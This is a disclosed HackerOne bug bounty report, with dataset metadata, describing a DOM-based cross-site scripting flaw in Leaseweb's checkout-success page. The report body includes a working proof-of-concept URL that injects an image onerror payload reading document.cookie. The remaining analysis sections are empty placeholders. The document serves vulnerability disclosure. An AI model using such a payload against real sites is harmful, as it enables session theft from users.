---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '105688'
original_report_id: '105688'
title: DOM Based XSS in Checkout
weakness: Cross-site Scripting (XSS) - Generic
team_handle: leaseweb
created_at: '2015-12-17T00:10:09.096Z'
disclosed_at: '2016-02-26T11:14:00.212Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# DOM Based XSS in Checkout

## Metadata

- HackerOne Report ID: 105688
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: leaseweb
- Disclosed At: 2016-02-26T11:14:00.212Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hey,

This works in all browsers I suppose and regardless if the user is currently authenticated or not. Simply go over to : [https://www.leaseweb.com/checkout-success/16893#"><img src=x onerror=alert(document.cookie)>](https://www.leaseweb.com/checkout-success/16893#"><img src=x onerror=alert(document.cookie)>).

Attached herewith is the screenshot.

Thanks!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
